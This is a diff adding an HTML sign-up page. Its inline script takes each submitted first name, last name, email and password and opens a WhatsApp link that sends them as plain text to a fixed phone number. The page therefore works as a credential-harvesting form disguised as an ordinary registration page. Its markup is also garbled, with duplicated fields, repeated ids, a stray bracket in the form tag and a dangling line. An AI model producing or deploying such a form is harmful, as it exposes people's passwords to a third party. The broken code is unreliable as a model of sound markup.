@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        form {
+            background-color: palegreen;
+        }
+
+        input[type="submit"] {
+            background-color: blue;
+            color: white;
+        }
+
+        input[type="Reset"] {
+            background-color: red;
+            color: white;
+        }
+    </style>
+    <script>
+        function sendWhatsAppMessage() {
+            var firstname = document.getElementById("firstname").value;
+            var lastname = document.getElementById("lastname").value;
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            var message = "First Name: " + firstname +
+                          "\nLast Name: " + lastname +
+                          "\nEmail: " + email +
+                          "\nPassword: " + password;
+            var url = "https://api.whatsapp.com/send?phone=+254759142486&text=" + encodeURIComponent(message);
+          message
+            window.open(url);
+        }
+    </script>
+</head>
+<body>
+  <center>  <h1>Sign up</h1></center>
+    <form ]method="POST" onsubmit="sendWhatsAppMessage(); return false;">
+       <center><label for="firstname">First Name:</label></center>
+       <center><input type="text" id="firstname" size="10" placeholder="username" required><br></center> <br>
+
+      <center><label for="lastname">Last Name:</label></center>
+      <center><input type="text" id="lastname" size="10" placeholder="username" required><br></center> <br>
+
+      <center><label for="email">Email:</label></center>
+      <center><input type="email" id="email" size="10"  placeholder="em@" required><br></center><br>
+  <center><label for="password">Password:</label></center>
+
+<center><input type="text" id="lastname" size="10" placeholder="username" required><br></center> <br>
+
+      <center><label for="email">Email:</label></center>
+      <center><input type="email" id="email" size="10"  placeholder="em@" required><br></center><br>
+  <center><label for="password">Password:</label></center>
+    <center><input type="password" id="password" size="10" placeholder="Abcd12!@" required><br></center> <br>
+
+    <center><input type="submit" size="20" value="Submit"></center> <br>
+    <center><input type="reset" value="Clear"></center>
+    </form>
+</body>
+
+
+
+
+
+
+
+
+
+
+
+
+
